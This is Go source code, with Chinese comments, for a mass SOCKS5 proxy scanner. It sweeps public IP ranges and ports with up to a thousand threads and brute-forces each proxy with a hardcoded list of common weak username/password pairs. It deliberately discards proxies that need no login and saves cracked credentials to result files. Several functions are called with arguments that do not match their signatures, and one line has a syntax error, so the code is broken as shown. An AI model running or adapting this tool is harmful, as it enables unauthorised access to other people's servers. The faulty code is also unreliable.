package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/cheggaaa/pb/v3"
	"golang.org/x/net/proxy"
	"golang.org/x/time/rate"
)

// ==================== 配置 ====================
var (
	weakPasswordsSlice [][2]string
	countryCache       sync.Map
	seenProxies        sync.Map
	validCount         int64
	detailFile, validFile, logFile *os.File
	countryCacheFile = "country_cache.json"
	limiter          = rate.NewLimiter(rate.Every(time.Second/100), 100)
	detailMu         sync.Mutex
	validMu          sync.Mutex
)

// ==================== 结果结构 ====================
type Result struct {
	IP       string
	Port     int
	Scheme   string
	Latency  int
	ExportIP string
	Country  string
	Auth     string
	IsWeak   bool
}

// ==================== 扫描任务 ====================
type scanTask struct {
	IP   string
	Port int
}

// ==================== 主函数 ====================
func main() {
	ipRange := flag.String("ip-range", "", "IP range: 192.168.1.1-192.168.1.255 or CIDR")
	portInput := flag.String("port", "", "Ports: 1080 / 80 8080 / 1-65535")
	threads := flag.Int("threads", 0, "Max concurrent connections")
	timeout := flag.Duration("timeout", 0, "Timeout per request (e.g. 5s)")
	urlInput := flag.String("url", "", "URL to fetch IP:port list from")
	flag.Parse()

	loadCountryCache()
	defer saveCountryCache()

	var err error
	logFile, err = os.OpenFile("scan.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer logFile.Close()
	log.SetOutput(io.MultiWriter(os.Stdout, logFile))
	log.SetFlags(log.LstdFlags)
	log.Printf("[*] 扫描开始: %s", time.Now().Format("2006-01-02 15:04:05"))

	defaultStart := "157.254.32.0"
	defaultEnd := "157.254.52.255"
	defaultPort := "1080"
	defaultThreads := 1000
	defaultTimeout := 5 * time.Second

	finalIPRange := *ipRange
	finalPortInput := *portInput
	finalURL := *urlInput
	finalThreads := *threads
	finalTimeout := *timeout

	if finalThreads == 0 {
		finalThreads = promptInt("最大并发数（默认: "+strconv.Itoa(defaultThreads)+"):", defaultThreads)
	}
	if finalTimeout == 0 {
		finalTimeout = promptDuration("超时时间（如 5s，默认: 5s）: ", defaultTimeout)
	}

	weakPasswordsSlice = loadWeakPasswords("weak_passwords.txt")

	detailFile, err = os.OpenFile("result_detail.txt", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Fatal("打开 result_detail.txt 失败: ", err)
	}
	validFile, err = os.OpenFile("proxy_valid.txt", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Fatal("打开 proxy_valid.txt 失败: ", err)
	}
	defer detailFile.Close()
	defer validFile.Close()

	log.Printf("[*] 最大并发: %d", finalThreads)
	log.Printf("[*] 超时时间: %v", finalTimeout)

	taskChan := make(chan scanTask, finalThreads*2)
	ctx, cancel := context.WithCancel(context.Background())
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		log.Println("[!] 收到中断信号，正在优雅退出...")
		cancel()
	}()

	// ==================== 生成任务 ====================
	go func() {
		defer close(taskChan)
		if finalURL != "" {
			streamAddrsFromURL(ctx, finalURL, finalPortInput, taskChan)
			return
		}

		if finalIPRange == "" {
			finalIPRange = promptIPRange(defaultStart, defaultEnd)
		}
		ipChan, _ := ipGenerator(finalIPRange)
		if finalPortInput == "" {
			finalPortInput = prompt("端口（默认: "+defaultPort+"): ", defaultPort)
		}
		ports, _ := parsePorts(finalPortInput)

		for ip := range ipChan {
			for _, port := range ports {
				select {
				case taskChan <- scanTask{IP: ip, Port: port}:
				case <-ctx.Done():
					return
				}
			}
		}
	}()

	// ==================== 进度条 ====================
	bar := pb.New(0)
	bar.SetWriter(io.MultiWriter(os.Stdout, logFile))
	bar.Set("prefix", "Scanning ")
	bar.Start()

	// ==================== Worker 池 ====================
	var wg sync.WaitGroup
	for i := 0; i < finalThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for task := range taskChan {
				select {
				case <-ctx.Done():
					return
				default:
				}
				result := scanProxy(ctx, task.IP, task.Port, finalTimeout)
				if result.Scheme != "" {
					key := fmt.Sprintf("%s:%d", result.IP, result.Port)
					if _, loaded := seenProxies.LoadOrStore(key, true); !loaded {
						writeResult(result)
					}
				}
				bar.Increment()
			}
		}()
	}

	wg.Wait()
	bar.Finish()
	log.Printf("[+] 已保存 %d 个代理 → proxy_valid.txt", atomic.LoadInt64(&validCount))
}

// ==================== 流式 URL 加载 ====================
func streamAddrsFromURL(ctx context.Context, u, portInput string, taskChan chan<- scanTask) {
	log.Printf("[*] 正在从 URL 流式加载代理: %s", u)
	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Get(u)
	if err != nil {
		log.Printf("[!] URL 获取失败: %v", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		log.Printf("[!] URL 返回状态: %d", resp.StatusCode)
		return
	}

	defaultPorts, _ := parsePorts(portInput)
	scanner := bufio.NewScanner(resp.Body)

	for scanner.Scan() {
		select {
		case <-ctx.Done():
			return
		default:
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" || !strings.Contains(line, ":") {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		ipStr := strings.TrimSpace(parts[0])
		portStr := strings.TrimSpace(parts[1])

		if net.ParseIP(ipStr) == nil {
			continue
		}

		var ports []int
		if port, err := strconv.Atoi(portStr); err == nil && port > 0 && port <= 65535 {
			ports = []int{port}
		} else if len(defaultPorts) > 0 {
			ports = defaultPorts
		} else {
			continue
		}

		for _, p := range ports {
			select {
			case taskChan <- scanTask{IP: ipStr, Port: p})
			case <-ctx.Done():
				return
			}
		}
	}
}

// ==================== 扫描代理 ====================
func scanProxy(ctx context.Context, ip string, port int, timeout time.Duration) Result {
	result := Result{IP: ip, Port: port}
	addr := fmt.Sprintf("%s:%d", ip, port)

	{
		auth := &proxy.Auth{User: "", Password: ""}
		dialer, err := proxy.SOCKS5("tcp", addr, auth, proxy.Direct)
		if err == nil {
			ok, _, _ := testSocks5WithDialer(ctx, dialer, timeout)
			if ok {
				// 空密码鉴权成功 → 说明节点配置错误，直接丢弃，不进入弱扫
				return result
			}
		}
	}

	for _, pair := range weakPasswordsSlice {
		if ctx.Err() != nil {
			return result
		}

		auth := &proxy.Auth{User: pair[0], Password: pair[1]}
		dialer, err := proxy.SOCKS5("tcp", addr, auth, proxy.Direct)
		if err != nil {
			continue
		}

		// SOCKS5 握手
		ok, lat, exportIP := testSocks5WithDialer(ctx, dialer, timeout)
		if !ok || !isPublicIP(exportIP) {
			continue
		}

		// 外网访问测试（优化后的）
		if !testInternetAccess(ctx, dialer, timeout) {
			continue
		}

		// 命中弱密码 → 填充结果
		result.Scheme = "socks5"
		result.Latency = lat
		result.ExportIP = exportIP

		result.Country = getCountry(exportIP)
		if result.Country == "XX" {
			result.Country = getCountry(ip)
		}

		result.Auth = fmt.Sprintf("%s:%s", pair[0], pair[1])
		result.IsWeak = true
		return result
	}

	return result
}

// ==================== SOCKS5 测试 ====================
func testSocks5WithDialer(dialer proxy.Dialer, timeout time.Duration) (bool, int, string) {
	// 使用独立限流 context 避免与外部 ctx 冲突
	if err := limiter.Wait(limiterCtx); err != nil {
		return false, 0, ""
	}

	start := time.Now()
	conn, err := dialer.Dial("tcp", "ifconfig.me:80")
	if err != nil {
		return false, 0, ""
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(timeout))
	fmt.Fprintf(conn, "GET /ip HTTP/1.1\r\nHost: ifconfig.me\r\nConnection: close\r\n\r\n")

	buf := make([]byte, 128)
	n, err := conn.Read(buf)
	if err != nil {
		return false, 0, ""
	}
	exportIP := strings.TrimSpace(string(buf[:n]))
	if exportIP == "" || !isPublicIP(exportIP) {
		return false, 0, ""
	}
	return true, int(time.Since(start).Milliseconds()), exportIP
}
// ==================== 外网访问检测 ====================
var defaultTransport = &http.Transport{
	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
}

func testInternetAccess(dialer proxy.Dialer, timeout time.Duration) bool {
	transport := defaultTransport.Clone()
	transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		dialCtx, cancel := context.WithTimeout(context.Background(), timeout)
    	defer cancel()
		return dialer.Dial(network, addr)
	}
	client := &http.Client{
		Timeout:   timeout,
		Transport: transport,
	}
	resp, err := client.Get("https://www.google.com/generate_204")
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == 204
}

// ==================== 公网 IP 判断 ====================
func isPublicIP(ipStr string) bool {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return false
	}
	return !ip.IsPrivate() && !ip.IsLoopback() && !ip.IsUnspecified()
}

// ==================== 国家信息查询 ====================
func getCountry(ip string) string {
	if v, ok := countryCache.Load(ip); ok {
		return v.(string)
	}
	country := queryCountry(ip)
	countryCache.Store(ip, country)
	return country
}

func queryCountry(ip string) string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("http://ip-api.com/json/" + ip + "?fields=countryCode")
	if err != nil {
		return "XX"
	}
	defer resp.Body.Close()

	var data struct {
		CountryCode string `json:"countryCode"`
	}
	if json.NewDecoder(resp.Body).Decode(&data) != nil || data.CountryCode == "" {
		return "XX"
	}
	return data.CountryCode
}

// ==================== 写入结果 ====================
func writeResult(r Result) {
	detailMu.Lock()
	fmt.Fprintf(detailFile, "%s:%d [%s] %s %dms %s\n", r.IP, r.Port, r.Scheme, r.Auth, r.Latency, r.Country)
	detailMu.Unlock()

	validMu.Lock()
	fmt.Fprintf(validFile, "%s:%d\n", r.IP, r.Port)
	validMu.Unlock()
}

// ==================== 交互输入 ====================
func prompt(msg, def string) string {
	fmt.Print(msg)
	scanner := bufio.NewScanner(os.Stdin)
	if scanner.Scan() {
		input := strings.TrimSpace(scanner.Text())
		if input != "" {
			return input
		}
	}
	return def
}

func promptInt(msg string, def int) int {
	s := prompt(msg, strconv.Itoa(def))
	i, err := strconv.Atoi(s)
	if err != nil || i <= 0 {
		return def
	}
	return i
}

func promptDuration(msg string, def time.Duration) time.Duration {
	s := prompt(msg, def.String())
	d, err := time.ParseDuration(s)
	if err != nil {
		return def
	}
	return d
}

func promptIPRange(start, end string) string {
	s := prompt("起始 IP（默认: "+start+"): ", start)
	e := prompt("结束 IP（默认: "+end+"): ", end)
	return s + "-" + e
}

// ==================== IP/端口解析 ====================
func ipGenerator(r string) (<-chan string, error) {
	if strings.Contains(r, "/") {
		return cidrGenerator(r)
	}
	return rangeDashGenerator(r)
}

func cidrGenerator(cidr string) (<-chan string, error) {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	ch := make(chan string)
	go func() {
		defer close(ch)
		for ip := copyIP(ipnet.IP.Mask(ipnet.Mask)); ipnet.Contains(ip); incIP(ip) {
			ch <- ip.String()
		}
	}()
	return ch, nil
}

func rangeDashGenerator(r string) (<-chan string, error) {
	parts := strings.Split(r, "-")
	if len(parts) != 2 {
		return nil, fmt.Errorf("invalid IP range format")
	}
	start := net.ParseIP(strings.TrimSpace(parts[0])).To4()
	end := net.ParseIP(strings.TrimSpace(parts[1])).To4()
	if start == nil || end == nil {
		return nil, fmt.Errorf("invalid IPv4 address")
	}
	ch := make(chan string)
	go func() {
		defer close(ch)
		for ip := copyIP(start); compareIP(ip, end) <= 0; incIP(ip) {
			ch <- ip.String()
		}
	}()
	return ch, nil
}

func copyIP(ip net.IP) net.IP {
	dup := make(net.IP, len(ip))
	copy(dup, ip)
	return dup
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func compareIP(a, b net.IP) int {
	a4 := a.To4()
	b4 := b.To4()
	if a4 == nil || b4 == nil {
		return strings.Compare(a.String(), b.String())
	}
	for i := 0; i < 4; i++ {
		if a4[i] < b4[i] {
			return -1
		} else if a4[i] > b4[i] {
			return 1
		}
	}
	return 0
}

func parsePorts(input string) ([]int, error) {
	var ports []int
	input = strings.ReplaceAll(input, ",", " ")
	for _, p := range strings.Fields(input) {
		if strings.Contains(p, "-") {
			r := strings.Split(p, "-")
			if len(r) != 2 {
				continue
			}
			s, _ := strconv.Atoi(strings.TrimSpace(r[0]))
			e, _ := strconv.Atoi(strings.TrimSpace(r[1]))
			if s < 1 || e > 65535 {
				continue
			}
			if s > e {
				s, e = e, s
			}
			for i := s; i <= e; i++ {
				ports = append(ports, i)
			}
		} else {
			port, _ := strconv.Atoi(strings.TrimSpace(p))
			if port >= 1 && port <= 65535 {
				ports = append(ports, port)
			}
		}
	}
	return ports, nil
}

// ==================== 弱密码加载 ====================
func loadWeakPasswords(file string) [][2]string {
	data, err := os.ReadFile(file)
	if err != nil {
		log.Printf("Warning: failed to load weak passwords file: %v", err)
		return [][2]string{		
			{"123456", "123456"}, {"password", "password"}, {"admin", "admin"},
			{"admin", "123456"}, {"root", "root"}, {"root", "123456"},
			{"123456789", "123456789"}, {"qwerty", "qwerty"}, {"12345", "12345"},
			{"12345678", "12345678"}, {"111111", "111111"}, {"user", "user"},
			{"user", "password"}, {"123", "123"}, {"proxy", "proxy"}, {"socks5", "socks5"},
			{"1234567", "1234567"}, {"iloveyou", "iloveyou"}, {"123123", "123123"},
			{"000000", "000000"}, {"welcome", "welcome"}, {"secret", "secret"},
			{"dragon", "dragon"}, {"monkey", "monkey"}, {"football", "football"},
			{"letmein", "letmein"}, {"sunshine", "sunshine"}, {"baseball", "baseball"},
			{"princess", "princess"}, {"admin123", "admin123"}, {"superman", "superman"},
			{"guest", "guest"}, {"", "123456"}, {"admin", ""}, {"", "admin"},
			{"test", "test"}, {"demo", "demo"}
		}
	}
	var list [][2]string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		if len(parts) == 2 {
			list = append(list, [2]string{parts[0], parts[1]})
		}
	}
	if len(list) > 0 {
		return list
	}
	return [][2]string{{"guest", "guest"}, {"admin", "admin"}}
}

// ==================== 国家缓存 ====================
func loadCountryCache() {
	data, err := os.ReadFile(countryCacheFile)
	if err != nil {
		return
	}
	var m map[string]string
	if err := json.Unmarshal(data, &m); err != nil {
		return
	}
	for k, v := range m {
		countryCache.Store(k, v)
	}
}

func saveCountryCache() {
	m := make(map[string]string)
	countryCache.Range(func(key, value any) bool {
		if k, ok := key.(string); ok {
			if v, ok := value.(string); ok {
				m[k] = v
			}
		}
		return true
	})
	data, _ := json.MarshalIndent(m, "", "  ")
	_ = os.WriteFile(countryCacheFile, data, 0644)
}
